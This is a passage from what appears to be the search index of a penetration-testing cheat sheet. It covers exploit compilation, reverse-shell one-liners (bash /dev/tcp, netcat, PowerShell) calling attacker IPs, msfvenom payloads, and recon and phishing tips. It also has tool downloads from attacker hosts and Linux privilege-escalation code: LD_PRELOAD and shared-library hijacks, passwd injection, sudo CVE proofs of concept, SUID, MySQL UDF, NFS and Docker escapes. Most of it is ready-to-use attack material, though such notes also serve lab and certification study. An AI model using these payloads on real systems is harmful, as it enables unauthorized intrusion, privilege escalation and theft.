<li>https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/working-with-exploits</li> </ul> <p>32-bit is usually represented by i686 and 64-bit is usually represented by x86_64. </p> <p>Identify arch : <pre><code>uname -a\ncat /proc/version\ndpkg --print-architecture\narch\nfile /sbin/init\n</code></pre></p> <p>If a C compiler is missing or inaccessible on your victim machine, you can compile the exploits on your Kali machine but you need some extra libraries on Kali.</p> <pre><code>apt-get install gcc-multilib\napt-get install g++-multilib\n</code></pre> <p>Then add add the <code>-m32</code> flag to your compile command.</p> <p>If \"error while loading shared libraries: requires glibc 2.5 or later dynamic linker\" :</p> <ul> <li>https://stackoverflow.com/questions/12075403/gcc-reduce-libc-required-version</li> </ul> <pre><code>gcc -m32 -Wl,--hash-style=both exploit.c -o exploit\n</code></pre>"},{"location":"Exploitation/Exploits/#cross-compiling","title":"Cross-compiling","text":"<p><pre><code>apt-get install mingw-w64\nx86_64-w64-mingw32-gcc shell.c -o shell.exe     # for 64bits Windows\ni686-w64-mingw32-gcc shell.c -o shell.exe       # for 32bits Windows\n</code></pre> Compile csharp: <pre><code>mcs -out:program.exe program.cs\n</code></pre></p>"},{"location":"Exploitation/Shells/","title":"Shells","text":""},{"location":"Exploitation/Shells/#reverse-shell","title":"Reverse shell","text":"<ul> <li>https://www.revshells.com/</li> <li>https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md</li> </ul>"},{"location":"Exploitation/Shells/#bash","title":"Bash","text":"<pre><code>bash -c 'exec bash -i &amp;&gt;/dev/tcp/192.168.119.126/443 &lt;&amp;1'\n</code></pre>"},{"location":"Exploitation/Shells/#netcat","title":"Netcat","text":"<pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.10 443 &gt;/tmp/f\n</code></pre>"},{"location":"Exploitation/Shells/#powershell-reverse-shell","title":"Powershell Reverse shell","text":"<pre><code>powershell -c \"$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"\n</code></pre>"},{"location":"Exploitation/Shells/#fully-interactive-tty","title":"Fully interactive TTY","text":"<pre><code>python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\nexport TERM=xterm\n\nCtrl + Z\nstty raw -echo; fg\n\nstty rows 72 columns 139\n</code></pre>"},{"location":"Exploitation/Shells/#better-netcat-listener-for-windows","title":"Better netcat listener for Windows","text":"<pre><code>rlwrap nc -lvnp 1337\n</code></pre> <p>rlfe lets you use history and line-editing in any text oriented tool. <pre><code>rlfe nc -lvnp 1337\n</code></pre></p>"},{"location":"Exploitation/Shells/#msfvenom","title":"MSFvenom","text":"<ul> <li> <p>https://netsec.ws/?p=331</p> </li> <li> <p>Check arch (x86 or x64)</p> </li> <li>Check shell or if meterpreter start the handler</li> </ul>"},{"location":"Exploitation/Shells/#binaries","title":"Binaries","text":"<p><pre><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf -o shell.elf\n</code></pre> <pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe -o shell.exe\n</code></pre> <pre><code>msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho -o shell.macho\n</code></pre></p>"},{"location":"Exploitation/Shells/#web","title":"Web","text":"<p><pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp\n</code></pre> <pre><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp\n</code></pre> <pre><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war\n</code></pre></p>"},{"location":"Methodologies/AD/","title":"AD","text":""},{"location":"Methodologies/AD/#no-credentials","title":"No credentials","text":"<ul> <li>user enum (kerbrute, smb, ldap, OWA)</li> <li>as_rep roasting</li> <li>zero logon</li> <li>bruteforce administrator dc</li> <li>password spray</li> </ul>"},{"location":"Methodologies/AD/#one-domain-user","title":"One domain user","text":"<ul> <li>get all ad users</li> <li>as_rep roasting (all users)</li> <li>kerberoasting</li> <li>bloodhound</li> <li>credentials or password reuse</li> <li>nopac</li> <li>smbclient on DC</li> <li>get-gpp</li> <li>credentials in userPassword &amp; unixUserPassword &amp; Description</li> <li>exposed services</li> </ul>"},{"location":"Methodologies/AD/#localadmin","title":"Localadmin","text":"<ul> <li>dump SAM</li> <li>dump logonPasswords</li> <li>Pass The Hash</li> <li>credentials or password reuse</li> </ul>"},{"location":"Methodologies/Exploits/","title":"Exploits","text":""},{"location":"Methodologies/Exploits/#finding-and-working-with-exploits","title":"Finding and working with exploits","text":"<ul> <li>choose the exploit carrefully</li> <li>manual review</li> <li>read about it on google</li> <li>add debug statements</li> <li>payload <ul> <li>arch</li> <li>rev / bind (try both !)</li> <li>stage / unstaged payload</li> <li>size ?</li> <li>AV ?</li> <li>Firewall restrictions ?</li> </ul> </li> <li>python version<ul> <li>py2 or 3 ?</li> <li>pyenv global system or 2.7</li> <li>2to3</li> <li>virtualenv</li> </ul> </li> <li>Compilation<ul> <li>on target if possible</li> <li>...todo...</li> </ul> </li> </ul>"},{"location":"Methodologies/PrivEsc/","title":"PrivEsc","text":""},{"location":"Methodologies/PrivEsc/#linux","title":"Linux","text":"<ul> <li>id</li> <li>sudo -l</li> <li>uname -a</li> <li>history</li> <li>find .<ul> <li>user directory</li> <li>web directory</li> </ul> </li> <li>Manual service / program enumeration</li> <li>linpeas</li> <li>pspy</li> </ul>"},{"location":"Methodologies/PrivEsc/#windows","title":"Windows","text":"<ul> <li>Manual user enumeration</li> <li>Privileges</li> <li>tree /f /a<ul> <li>user directory</li> <li>web directory</li> </ul> </li> <li>Manual service / program enumeration</li> <li>WinPeas.exe / PowerUp.ps1</li> <li>Windows Exploit Suggester</li> </ul>"},{"location":"Methodologies/Recon/","title":"Recon the target","text":"<ul> <li>Organization<ul> <li>Goals</li> <li>Mergers and Acquisitions</li> <li>Projects and Products</li> <li>Recent news</li> </ul> </li> <li>Infrastructure<ul> <li>IP Addresses</li> <li>Hostnames</li> <li>Software &amp; Hardware</li> </ul> </li> <li>Employees<ul> <li>Usernames</li> <li>Email addresses</li> <li>Breached credentials</li> <li>Roles</li> </ul> </li> </ul>"},{"location":"Methodologies/Recon/#organization-recon","title":"Organization Recon","text":"<ul> <li>Information on the Organization</li> <li>Wikipedia</li> <li>Press Releases and Annual Reports</li> <li>Open Job</li> <li>Gather Competitive Intelligence</li> </ul>"},{"location":"Methodologies/Recon/#infrastructure-recon","title":"Infrastructure Recon","text":"<ul> <li>IP address assinment whois databases<ul> <li>whois</li> </ul> </li> <li>DNS and host names<ul> <li>dig @[server] [name] [type]</li> <li>zone transfer <code>dig @10.10.10.60 domain.tld -t AXFR</code></li> <li><code>dnsrecon -d domain.tld -t type</code></li> <li>dnsdumpster.com</li> </ul> </li> <li>google dorks<ul> <li>site:domain.tld -site:notuseful.domain.tld</li> <li>intitle:index.of passwd</li> <li>inurl:viewtopic.php</li> <li>filetype:docx,xlsx</li> <li>Google Hacking Database</li> </ul> </li> <li>Shodan</li> <li>BuiltWith / Wappalyzer</li> <li>Hostname Information</li> </ul>"},{"location":"Methodologies/Recon/#user-recon","title":"User Recon","text":"<ul> <li>Metadata<ul> <li>exiftool</li> <li>strings</li> </ul> </li> <li>Emails / Usernames / Patterns<ul> <li>hunter.io</li> <li>Breached data<ul> <li>torrent</li> <li>dehashed</li> <li>intelx</li> <li>pwndb (https://pwndb2am4tzkvold.tor2web.io/)</li> </ul> </li> </ul> </li> <li>Social media<ul> <li>Linkedin<ul> <li>LinkedInt</li> <li>crosslinked</li> </ul> </li> </ul> </li> <li>GatherContacts (Burp extension - to check)</li> <li>Automated OSINT tool<ul> <li>SpiderFoot (add API keys for better results)</li> </ul> </li> </ul>"},{"location":"Methodologies/Web/","title":"Web","text":""},{"location":"Methodologies/Web/#web-methodology","title":"Web methodology","text":"<ul> <li>Visit the website</li> <li>Put in Burp target scope</li> <li>nikto (-C)</li> <li>Start making a wordlist<ul> <li>cewl</li> </ul> </li> <li>View source page - comments<ul> <li>link location</li> <li>usernames</li> <li>passwords</li> <li>api</li> </ul> </li> <li>Enumerate version<ul> <li>CMS version -&gt; CHANGELOG.txt</li> <li>Github -&gt; release date, security announcements    </li> <li>Copyright year</li> </ul> </li> <li>Gobuster directory (at least html,js,txt,php | add asp,aspx if windows)<ul> <li>/usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt</li> <li>/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</li> <li>big.txt or technology related (CMS, apache etc.)</li> <li>use -f option to add \"/\" after the word</li> </ul> </li> <li>Try the paths found in other services like ftp, smb... </li> <li>Robots.txt , sitemap.xml, .git, cgi-bin,  cgi-mod,  cgi-sys,(shellshock)</li> <li>WebDav ? davtest -&gt; cadaver</li> <li>Nmap NSE could help. e.g. nmap -sV --script \"http-iis*\" -p 80 $IP</li> <li>Gobuster subdomains (vhost) or FUZZ</li> <li>Search backup files -&gt; bfac</li> <li>Check cookies , jwt etc. Js files</li> <li>Any files to download ? Check metadata, google images, stegano..</li> <li>Wayback machine</li> <li>Google dorks</li> <li>./testssl.sh (hearthbleed)</li> <li>Search exploit based on version CMS, plugins...Even if its a new one (ex: php 8.1.0-dev)</li> <li>Login ?<ul> <li>Default credentials</li> <li>Guessable credentials (user/user, admin/admin, default_user/, software_name/software_name, hostname/hostname...)</li> <li>quick win sqli (' or 1=1; -- -)</li> <li>BruteForce (sort the wordlist if big)</li> <li>cewl wordlist</li> </ul> </li> <li>Identify parameters<ul> <li>Test for SQLi / RFI / LFI / XSS / OS injection / XXE etc. -&gt; Use FUZZ and always check proxy request output</li> </ul> </li> </ul>"},{"location":"Misc/Misc/","title":"Misc","text":""},{"location":"Misc/Misc/#phishing","title":"Phishing","text":"<p>Find a good domain name with powerful filters : https://www.expireddomains.net/</p> <p>Test and improve your phishing mail : https://www.mail-tester.com/</p>"},{"location":"Misc/Misc/#nac-bypass","title":"NAC bypass","text":"<pre><code>macchanger -m aa:bb:cc:dd:ee:ff eth0\n</code></pre>"},{"location":"Misc/Misc/#vim-recover-swp-file","title":"Vim recover .swp file","text":"<pre><code>vim -r file.swp\n</code></pre>"},{"location":"Misc/Misc/#awk-usage","title":"Awk usage","text":"<pre><code>awk -F: '{print $1}' /etc/passwd\n</code></pre>"},{"location":"Misc/Misc/#certutil-hash","title":"certutil hash","text":"<pre><code>certutil -hashfile C:\\path\\to\\file.txt MD5\n</code></pre>"},{"location":"Misc/Misc/#print-raw-hex-bytes","title":"print raw hex bytes","text":"<ul> <li>https://stackoverflow.com/questions/31917595/how-to-write-a-raw-hex-byte-to-stdout-in-python-3</li> </ul> <pre><code>python -c 'import sys; sys.stdout.buffer.write(b\"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\")' &gt; exploit.txt\n</code></pre>"},{"location":"Misc/Misc/#disable-aslr","title":"Disable ASLR","text":"<pre><code>sudo bash -c 'echo 0 &gt; /proc/sys/kernel/randomize_va_space'\n</code></pre>"},{"location":"Misc/Misc/#quit-telnet","title":"Quit telnet","text":"<pre><code>Ctrl + ]\nquit\n</code></pre>"},{"location":"Post-Exploitation/Pivoting/","title":"Pivoting","text":""},{"location":"Post-Exploitation/Pivoting/#ssh-dynamic-port-forwarding","title":"SSH Dynamic port forwarding","text":"<pre><code>ssh -D 127.0.0.1:9876 user@$IP\n</code></pre>"},{"location":"Post-Exploitation/Pivoting/#sshuttle","title":"sshuttle","text":"<pre><code>sshuttle -r user@$IP 10.10.10.0/24\n</code></pre>"},{"location":"Post-Exploitation/File%20Transfer/Linux/","title":"Linux","text":""},{"location":"Post-Exploitation/File%20Transfer/Linux/#http","title":"HTTP","text":"<pre><code>python3 -m http.server 80\nwget http://10.10.10.10/linpeas.sh\n</code></pre>"},{"location":"Post-Exploitation/File%20Transfer/Linux/#tcp-netcat","title":"TCP (netcat)","text":"<pre><code>nc -nv 10.10.14.18 9876 &lt; file\nnc -nvlp 9876 &gt; file\n</code></pre>"},{"location":"Post-Exploitation/File%20Transfer/Windows/","title":"Windows","text":""},{"location":"Post-Exploitation/File%20Transfer/Windows/#copy-paste","title":"COPY / PASTE","text":"<pre><code>certutil -encode file.txt file_b64.txt\ncertutil -decode b64_encoded outfile\n\n# decode on linux\ncat file.b64| base64 -w 0 -d &gt; file.txt \n</code></pre>"},{"location":"Post-Exploitation/File%20Transfer/Windows/#http","title":"HTTP","text":"<p><pre><code>certutil -f -urlcache http://10.10.10.10/PowerUp.ps1 C:/Windows/Tasks/PowerUp.ps1\n</code></pre> <pre><code>// System.Net.WebClient is by default proxy aware\n(new-object System.Net.WebClient).DownloadFile('http://$IP/nc.exe','C:\\Windows\\Tasks\\nc.exe')\n\n\nInvoke-WebRequest http://$IP/file.exe -OutFile file.exe\n</code></pre> <pre><code>cscript wget.vbs http://10.10.10.10/nc.exe nc.exe\n</code></pre></p>"},{"location":"Post-Exploitation/File%20Transfer/Windows/#smb","title":"SMB","text":"<pre><code>impacket-smbserver share . -smb2support\ncopy \\\\10.10.10.10\\share\\nc.exe nc.exe\n\ncopy .\\folder\\*.* \\\\192.168.119.189\\share\\ /Z /Y\n\nimpacket-smbserver share . -smb2support -username user -password secret\nnet use z: \\\\10.10.10.10\\share /u:user secret\ncopy bloodhound.zip \\\\10.10.10.10\\share\\\nnet use /d \\\\10.10.10.10\\share\n</code></pre>"},{"location":"Post-Exploitation/Privilege%20Escalation/Linux/","title":"Linux","text":""},{"location":"Post-Exploitation/Privilege%20Escalation/Linux/#tools","title":"Tools","text":"<ul> <li>LinPEAS: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS</li> <li>LinEnum: https://github.com/rebootuser/LinEnum</li> <li>Linux exploit suggester: https://github.com/mzet-/linux-exploit-suggester</li> <li>LinuxPrivChecker: https://github.com/sleventyeleven/linuxprivchecker</li> <li>PsPy : https://github.com/DominicBreuker/pspy</li> <li>GTFObins : https://gtfobins.github.io/</li> </ul>"},{"location":"Post-Exploitation/Privilege%20Escalation/Linux/#user-enumeration","title":"User enumeration","text":"<pre><code>whoami\nid\nsudo -l\ncat /etc/passwd\n</code></pre>"},{"location":"Post-Exploitation/Privilege%20Escalation/Linux/#system-enumeration","title":"System enumeration","text":"<pre><code>hostname\nuname -a\ncat /proc/version\ncat /etc/issue # Distribution\nlscpu # Arch\nps aux | grep root\ncat /etc/*-release\nldd --version # glibc version\n</code></pre>"},{"location":"Post-Exploitation/Privilege%20Escalation/Linux/#network-enumeration","title":"Network enumeration","text":"<pre><code>ip a\nifconfig\niwconfig\nip route\nroute\narp -a\nip neigh\nnetstat -ano\nnetstat -tunlp\nsockstat # FreeBSD\nsockstat -4l # FreeBSD, only IPv4\n</code></pre>"},{"location":"Post-Exploitation/Privilege%20Escalation/Linux/#account-lockout","title":"Account lockout","text":"<pre><code>grep tally /etc/pam.d/*\ngrep tally /etc/pam.conf\n</code></pre>"},{"location":"Post-Exploitation/Privilege%20Escalation/Linux/#escape-restricted-shells","title":"Escape restricted shells","text":"<ul> <li>https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells?slide=6</li> </ul>"},{"location":"Post-Exploitation/Privilege%20Escalation/Linux/#password-hunting","title":"Password Hunting","text":"<p>Keywords to try : pass, secret, key... <pre><code>find . # From user, opt or web server directories\ngrep --color=auto -rnw '/' -ie \"PASSWORD=\" --color=always 2&gt;/dev/null\nfind . -type f -exec grep -i -I \"PASSWORD\" {} /dev/null \\;\nfind / -name *.txt 2&gt;/dev/null\n</code></pre> SSH <pre><code>find / -name authorized_keys 2&gt;/dev/null\nfind / -name id_rsa 2&gt;/dev/null\n</code></pre> History files <pre><code>cat ~/.*history | less\n</code></pre> Also take a look at config files.</p>"},{"location":"Post-Exploitation/Privilege%20Escalation/Linux/#weak-file-permissions","title":"Weak File Permissions","text":"<p>Shadow file : Crack hash if readable. Generate password if writable, then replace root password in the shadow file and su root. <pre><code>ls -l /etc/shadow\ncat /etc/shadow \nmkpasswd -m sha-512\n</code></pre></p> <p>Passwd file : Generate password if writable, then replace the \"x\" in second field by the password generated and su root. <pre><code>ls -l /etc/passwd\nopenssl passwd newpasswordhere\n\n\necho newroot:YiV30ZoQz25SA:0:0:root:/root:/bin/bash &gt;&gt; /etc/passwd\n# Connect using newroot:pentest\n</code></pre></p> <p>Lib directories : Craft a malicious libcustom library and replace it into /lib or /usr/lib. When executing /usr/bin/myexec, the malicious library will be called instead. <pre><code>ls -l /lib\nls -l /usr/lib\n</code></pre></p>"},{"location":"Post-Exploitation/Privilege%20Escalation/Linux/#kernel-exploits","title":"Kernel Exploits","text":"<ul> <li>https://github.com/lucyoa/kernel-exploits</li> </ul> <p><pre><code># Google is your friend\n./linux-exploit-suggester.sh\n./linux-exploit-suggester.sh --checksec\n./linux-exploit-suggester.sh --uname &lt;uname-string&gt;\n</code></pre> MSF <pre><code>post/multi/recon/local_exploit_suggester\n</code></pre></p> <p>Dirty Cow : </p> <ul> <li>https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs. </li> <li>https://github.com/dirtycow/dirtycow.github.io/wiki/Patched-Kernel-Versions</li> <li>Binary should be compiled on the target. </li> </ul> <pre><code>gcc -pthread c0w.c -o c0w\n./c0w\npasswd\n</code></pre> <p>Dirty Pipe CVE-2022-0847 - Linux Kernel 5.8 &lt; 5.16.11 :</p> <ul> <li>https://github.com/basharkey/CVE-2022-0847-dirty-pipe-checker</li> <li>https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit</li> </ul>"},{"location":"Post-Exploitation/Privilege%20Escalation/Linux/#sudo","title":"Sudo","text":"<pre><code>sudo -l # GTFObins AND Google are your friends\n</code></pre> <p>Sudo can be configured to inherit certain environment variables, check env_keep+=.</p> <ul> <li>LD_PRELOAD specifies a library which will be loaded prior to any other library when the program gets executed.</li> </ul> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;stdlib.h&gt;\n\nvoid _init() {\n    unsetenv(\"LD_PRELOAD\");\n    setgid(0);\n    setuid(0);\n    system(\"/bin/bash\");\n}\n</code></pre> <pre><code>gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /tmp/preload.c\nsudo LD_PRELOAD=/tmp/preload.so &lt;sudo-binary&gt;\n</code></pre> <ul> <li>LD_LIBRARY_PATH indicates an additionnal directory to search for libraries.</li> </ul> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nstatic void hijack() __attribute__((constructor));\n\nvoid hijack() {\n        unsetenv(\"LD_LIBRARY_PATH\");\n        setresuid(0,0,0);\n        system(\"/bin/bash -p\");\n}\n</code></pre> <pre><code>ldd /usr/sbin/binary # check shared libraries used by the program\ngcc -o /tmp/lib_name.so.1 -shared -fPIC /tmp/library_path.c # create a shared object with the same name as one of the listed libraries (lib_name.so.1)\nsudo LD_LIBRARY_PATH=/tmp binary # set the LD_LIBRARY_PATH environment variable to /tmp (where the compiled shared object was put)\n</code></pre> <ul> <li>Sudo &lt; 1.8.2-1.8.31p2 &amp; 1.9.0-1.9.5p1 Baron Samedit, CVE-2021-3156 : https://github.com/worawit/CVE-2021-3156 or https://github.com/blasty/CVE-2021-3156</li> </ul> <pre><code># PoC\nsudoedit -s '\\' `perl -e 'print \"A\" x 65536'`\nsudoedit -s '\\' $(python3 -c 'print(\"A\"*1000)')\n</code></pre> <ul> <li>Sudo &lt; 1.8.27 Security Bypass (!root), CVE-2019-14287 : https://www.exploit-db.com/exploits/47502</li> </ul> <pre><code>sudo -u#-1 &lt;command&gt;\nsudo -u#-1 /bin/bash\n</code></pre> <ul> <li>Sudo &lt; 1.8.26 Buffer Overflow (pwfeedback) / CVE-2019-18634 : https://github.com/saleemrashid/sudo-cve-2019-18634</li> </ul> <p>pwfeedback is the option that print the char '*' when you type your password when using sudo.</p> <pre><code>cat /etc/sudoers # The buffer overflow is possible if pwfeedback is set in /etc/sudoers\ngcc exploit.c -o exploit\n</code></pre>"},{"location":"Post-Exploitation/Privilege%20Escalation/Linux/#suid-sgid","title":"SUID / SGID","text":"<pre><code>find / -type f -a \\( -perm -u+s -o -perm -g+s \\) -exec ls -l {} \\; 2&gt; /dev/null\n</code></pre> <ul> <li>Look on GTFOBins : https://gtfobins.github.io/</li> <li> <p>Look for known exploits</p> </li> <li> <p>Shared object injection</p> </li> </ul> <p><pre><code># search for .so file loaded in a writable directory\nstrace &lt;SUID-BINARY&gt; 2&gt;&amp;1 | grep -i -E \"open|access|no such file\"   \n</code></pre> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nstatic void inject() __attribute__((constructor));\n\nvoid inject(){\n    system(\"cp /bin/bash /tmp/bash &amp;&amp; chmod +s /tmp/bash &amp;&amp; /tmp/bash -p\");\n}\n</code></pre> <pre><code>gcc -shared -fPIC -o /home/user/.config/lib.so /home/user/.config/lib.c\n</code></pre></p> <ul> <li>If a binary is called without its path, it can be exploited due to it inheriting the user's PATH environment variable and attempting to execute programs without specifying an absolute path :</li> </ul> <pre><code>strings /usr/bin/suid-program # identify binary without full path inside\n\ntype binary # not built-in\n\nexport PATH=/tmp:$PATH\necho \"/bin/sh -p\" &gt; /tmp/binary\nchmod +x /tmp/binary\n\n/usr/bin/suid-program\n</code></pre> <ul> <li>Abusing shell features, bash &lt; 4.2.048 :</li> </ul> <p>In Bash versions &lt; 4.2-048 it is possible to define shell functions with names that resemble file paths, then export those functions so that they are used instead of any actual executable at that file path.</p> <pre><code>/bin/bash --version\n\nstrings /usr/local/bin/suid-program # identify the absolute path of the executable (/usr/sbin/service)\n\nfunction /usr/sbin/service { /bin/bash -p; }\nexport -f /usr/sbin/service\n\n/usr/local/bin/suid-program\n</code></pre> <ul> <li>Abusing shell features, bash &lt; 4.4 :</li> </ul> <p>When in debugging mode, Bash uses the environment variable PS4 to display an extra prompt for debugging statements</p> <pre><code>env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2\n/tmp/rootbash -p\n</code></pre> <ul> <li>PwnKit CVE-2021-4034 : https://github.com/ly4k/PwnKit</li> </ul> <pre><code>./PwnKit id\n./Pwnkit # interactive shell\n</code></pre>"},{"location":"Post-Exploitation/Privilege%20Escalation/Linux/#crontab","title":"Crontab","text":"<p>PsPy is your friend.</p> <pre><code>cat /etc/crontab\n</code></pre> <p>Check for:</p> <ul> <li>File permissions</li> </ul> <pre><code>find / -name program.sh\nls -l /path/to/program.sh\n</code></pre> <ul> <li> <p>PATH : Create program in writable path executed first and make it executable !</p> </li> <li> <p>Wildcards (*)</p> </li> <li> <p>Search exploits on commands running as root</p> </li> </ul>"},{"location":"Post-Exploitation/Privilege%20Escalation/Linux/#capabilities","title":"Capabilities","text":"<pre><code>getcap -r / 2&gt;/dev/null\n# /usr/bin/python2.6 = cap_setuid+ep\n\n/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'\n</code></pre> <p>Interresting capabilities are : - ep = the binary has all the capabilities - cap_dac_read_search = read anything - cap_setuid+ep = setuid</p>"},{"location":"Post-Exploitation/Privilege%20Escalation/Linux/#localhost-services","title":"Localhost services","text":"<p>Redirect local port 8888 on remote port 5901 accessible only from localhost through ssh  <pre><code>netstat -tunlp # Notice localhost service\nssh -L 8888:127.0.0.1:5901 user@10.10.10.10\n</code></pre></p>"},{"location":"Post-Exploitation/Privilege%20Escalation/Linux/#mysql-service","title":"MySQL service","text":"<ul> <li>If MySQL service is running as root and the \"root\" user for the service does not have a password assigned we can abuse User Defined Function (UDF)</li> </ul> <pre><code>ps aux | grep root\nmysql -u root [-p pass]\n</code></pre> <ul> <li>enumerate FILE permission, version and plugin_dir</li> </ul> <pre><code># look privileges \nSHOW Grants;\n\n# look at variables including hostname, plugin_dir, tmpdir, version, version_compile_machine \nshow variables;\nshow variables where (Variable_name=\"hostname\" or Variable_name=\"plugin_dir\" or Variable_name=\"version\" or Variable_name=\"tmpdir\" or Variable_name=\"version_compile_machine\");\n</code></pre> <p>Exploit : https://www.exploit-db.com/exploits/1518</p> <ul> <li>Compile</li> </ul> <pre><code>gcc -g -c raptor_udf2.c -fPIC\ngcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc\n</code></pre> <ul> <li>Connect to mysql and create a User Defined Function (UDF) \"do_system\" :<ul> <li>In MySQL versions prior to 4.1.25 / 5.0.67, the .so file must be in a directory that is searched by your system\u2019s dynamic linker.  </li> <li>Otherwise the .so file must be located in the plugin directory. If no plugin_dir, the previous behavior apply.</li> </ul> </li> </ul> <pre><code>use mysql;\ncreate table foo(line blob);\ninsert into foo values(load_file('/tmp/raptor_udf2.so'));\nselect * from foo into dumpfile '/lib/raptor_udf2.so';\ncreate function do_system returns integer soname 'raptor_udf2.so';\n\nselect do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');\n\nexit\n\n/tmp/rootbash -p\n</code></pre>"},{"location":"Post-Exploitation/Privilege%20Escalation/Linux/#nfs-root-squashing","title":"NFS root squashing","text":"<ul> <li>Files created via NFS inherit the remote user's ID. If the user is root, and root squashing is enabled, the ID will instead be set to the \"nobody\" user.</li> <li>https://book.hacktricks.xyz/linux-hardening/privilege-escalation/nfs-no_root_squash-misconfiguration-pe</li> </ul> <pre><code># On victim machine, notice /shared share has root squasing disabled \ncat /etc/exports\n\n# On attacking machine\n# remote check the name of the folder\nshowmount -e $IP\n\n# create dir\nmkdir /tmp/nfsdir  \n\n# mount directory \nmount -t nfs $IP:/shared /tmp/nfsdir [OR] mount -o rw,vers=2 $IP:/shared /tmp/nfsdir\ncd /tmp/nfsdir\n\n# copy wanted shell \ncp /bin/bash .  \n\n# set suid permission on it\nchmod +s bash \n\n# On victim machine, run bash\n/shared/bash -p\n</code></pre>"},{"location":"Post-Exploitation/Privilege%20Escalation/Linux/#docker","title":"Docker","text":"<pre><code>id  # docker group\nfind / -name docker.sock 2&gt;/dev/null    # /run/docker.sock\ndocker images   # repository bash\ndocker run -it -v /:/host/ bash chroot /host/ bash\n</code></pre>"},{"location":"Post-Exploitation/Privilege%20Escalation/Linux/#other","title":"Other","text":"<pre><code>screen -r session_name/\ntmux attach-s -t session_name\n</code></pre>"},{"location":"Post-Exploitation/Privilege%20Escalation/Linux/#euid-to-uid-root","title":"EUID to UID root","text":"<pre><code>python -c 'import pty; import os; os.setuid(0); 